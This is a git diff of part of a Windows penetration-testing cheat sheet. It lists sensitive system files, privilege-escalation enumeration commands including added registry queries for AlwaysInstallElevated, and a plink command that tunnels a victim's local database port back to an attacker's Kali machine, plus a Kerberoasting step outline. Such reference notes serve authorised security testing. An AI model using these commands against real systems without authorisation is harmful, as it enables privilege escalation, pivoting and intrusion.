@@ -1,6 +1,7 @@
 # Windows
 
 ### Important Files
+
 ```
 c:\windows\system32\drivers\etc\hosts
 c:\windows\win.ini
@@ -13,6 +14,8 @@ C:\Windows\System32\DRIVERS
 
 ```
 windows-privesc-check2.exe --dump -a		# https://github.com/pentestmonkey/windows-privesc-check 
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 systeminfo
 schtasks /query /fo LIST /v		# scheduled task
 Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}	# list all running services 
@@ -84,6 +87,7 @@ Format of Hashes:
 Ref: https://techgenix.com/how-cracked-windows-password-part2/
 
 ### Pivoting
+
 ```
 ----------PLINK.EXE----------
 cmd.exe /c echo y | plink.exe -ssh -l [KALI_USERNAME] -pw [KALI_PASSWORD] -R [KALI_IP]:[KALI_PORT]:127.0.0.1:3306 [KALI_IP]
@@ -250,6 +254,7 @@ Foreach($obj in $Result)
 	Write-Host "------------------------"
 }
 ```
+
 1. Find interesting SPN (Service Principal Name)
 2. Get its SAMaccountname
 
